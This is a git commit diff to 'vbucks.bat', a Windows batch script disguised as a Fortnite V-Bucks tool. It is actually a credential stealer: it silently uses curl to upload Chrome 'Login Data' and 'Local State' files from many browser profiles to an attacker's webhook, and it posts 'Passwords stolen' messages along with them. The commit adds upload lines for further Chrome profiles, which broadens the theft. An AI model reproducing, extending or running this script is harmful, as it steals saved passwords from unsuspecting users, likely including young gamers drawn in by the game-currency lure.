d04d50b5ed8010583092a7dce13ff9b4448598fa
Alec Kozlov <44117836+TheTimeShare@users.noreply.github.com>
2022-11-23 13:02:49 +0100

    Update vbucks.bat

--- vbucks.bat
+++ vbucks.bat
@@ -11,6 +11,15 @@ curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Ty
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- Passwords stolen -```\"}"  %webhook%
 curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
 curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Guest Profile\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 1\Login Data" %webhook%
 curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 2\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 3\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 4\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 5\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 6\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 7\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 8\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 9\Login Data" %webhook%
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 10\Login Data" %webhook%
 curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Stolen by Alec Molotova Kozlov```\"}"  %webhook%
